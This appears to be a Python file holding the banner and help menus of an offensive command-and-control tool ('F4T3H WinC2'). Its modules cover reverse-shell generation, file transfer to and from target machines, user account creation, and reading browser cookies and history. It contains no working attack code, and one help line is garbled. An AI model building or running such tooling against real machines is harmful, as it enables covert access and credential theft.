
from os import system

def banner():
    system("clear")
    print("""
     ______ _  _ _______ ____  _    _ 
    |  ____| || |__   __|___ \\| |  | |
    | |__  | || |_ | |    __) | |__| |
    |  __| |__   _|| |   |__ <|  __  |-WinC2 v1.1
    | |       | |  | |   ___) | |  | | By: 0xGhazy
    |_|       |_|  |_|  |____/|_|  |_| 


    > Script Options:                       > Description
    -----------------                       -------------
    gen-shell                               - Generating a new Shell with a spasific shell name, rhost, and rport.\n
    ls-conn                                 - Display all incomming/saved connections from your clients.\n
    listning                                - Starting listining to incomming connections.\n
    help                                    - Displaying help menue.\n
    main                                    - Displaying this banner again.\n
    exit                                    - Exit this awsome tool :(\n""")




def trans_module_help():
    return """
    [-] Trans-Module:
    -----------------
    send                                - Sending binary files from your 'SENDING_PATH' dir to target machine.\n
    get                                 - Downloading binary files from the target machine.\n
    exsent                              - Sending binary files from external resource to target machine.\n
    """

def networking_module_help():
    return """
    [-] Networking-Module:
    ----------------------
    port-scan                           - Scanning ip address for opened port numbers.
                                              F4T3H> scan <IP ADDRESS>:<PORT1,PORT2..>\n
    geoip                               - Getting information about ip address.\n
    list-connections                    - Display list of all connections.\n
    """

def system_module_help():
    return """
    [-] System-Management-Module:
    -----------------------------
    system-info                         - Display all system's information like 'systeminfo'\n
    whoami                              - Returning the Currant user and his statue if admin or not.\n
    add-user                            - Adding a new user to users list.\n
    del-user                            - Deleting user from users list.\n
    """

def file_module_help():
    return """
    [-] File-Mangaement:
    --------------------
    write                               - commsd65s4d6s4d5s4d645
                                        F4T3H> write <FILE NAME>\n
    delete                              - Deleting files from Directory.
                                        F4T3H delete <FILE Name>\n
    edit
    rename
    find
    fstmp
    fstate
    run
    calc-SHA1
    calc-SHA224
    calc-SHA256
    calc-SHA384
    calc-MD5
    """

def cracking_module_help():
    return """
    [-] Cracking-Module:
    --------------------
    zip-crack
    """

def browser_module_help():
    return """
    [-] Browser-Module:
    -------------------
    read-cookies
    read-history
    """


# def pscanner_help():
#     print("[?] Port Scanner Help")
#     print("=====================\n")
#     print("Syntax: scan ip_address:port_number1,port_number")
#     print("example: scan 127.0.0.1:8080,80,1177\nScanning. . .")
#     print("[+] Scan Result of (8080,80,1177) ports")
#     print("[+] Port 8080 is open")
#     print("[+] Port 80 is open")
#     print("[+] Port 1177 is open")


# def ip_info_help():
#     print("[?] IP Information Help")
#     print("=======================\n")

















